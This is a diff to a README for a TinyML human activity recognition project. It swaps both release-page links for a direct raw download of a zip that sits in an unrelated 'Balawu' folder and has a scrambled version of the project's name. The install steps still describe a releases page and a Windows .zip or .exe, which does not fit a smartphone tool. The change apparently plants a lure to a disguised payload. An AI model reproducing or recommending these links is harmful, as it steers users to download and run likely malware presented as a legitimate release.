@@ -1,6 +1,6 @@
 # 🏃 TinyML-Human-Activity-Recognition-on-Edge-Devices - Track physical movement using your smartphone
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/main/Balawu/Devices-Recognition-Human-M-Activity-on-Tiny-Edge-3.5.zip)
 
 This software identifies human physical activities using data from smartphone sensors. It runs lightweight artificial intelligence models on your device to detect movement patterns such as walking, sitting, or running. The system uses deep learning techniques to process time-series data locally without sending your information to a cloud server.
 
@@ -20,7 +20,7 @@ The objective involves creating an efficient tool for human activity recognition
 
 You must visit the project release page to download the latest version for your Windows computer. Follow these steps to obtain the files:
 
-1. Visit [this page to download](https://github.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/main/Balawu/Devices-Recognition-Human-M-Activity-on-Tiny-Edge-3.5.zip).
 2. Locate the most recent package marked as the "Latest release."
 3. Select the file ending in .zip or .exe.
 4. Save the file to a folder on your computer.
